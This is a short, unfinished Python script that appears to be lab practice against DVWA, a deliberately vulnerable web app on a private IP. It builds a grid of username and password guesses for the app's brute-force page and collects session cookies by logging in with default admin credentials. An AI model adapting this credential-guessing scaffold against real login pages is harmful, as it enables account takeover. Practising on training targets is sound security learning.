#from tornado import ioloop, httpclient
#import urllib.request, concurrent.futures
#import asyncio, requests
#from concurrent.futures import ThreadPoolExecutor
import requests
import httpx
import asyncio

users = ['user' + str(n) for n in range(5)]
passwords = ['password' + str(n) for n in range(5)]
users.append('admin')
passwords.append('password')

cookies = {
    'PHPSESSID': '92ce34c675b735e26f91734bac4584bd',
    'security': 'high'
}

cookies = []

urls = {}
for user in users:
    for password in passwords:
        url = ''
        url += 'http://192.168.1.167/dvwa/vulnerabilities/brute/'
        url += '?username=' + user
        url += '&password=' + password
        url += '&Login=Login'
        #urls.append(url)
        urls[url] = ''

def get_dvwa_cookies():
    dvwa_login = {'username': 'admin', 'password': 'password', 'Login':'Login'}
    for url in urls.keys():
        with requests.Session() as session:
            with session.post('http://192.168.1.167/dvwa/login.php', data=dvwa_login) as req:
                print(session.cookies.get_dict())
                urls[url] = session.cookies['PHPSESSID']
                print(req.url)

    print(urls)

get_dvwa_cookies()

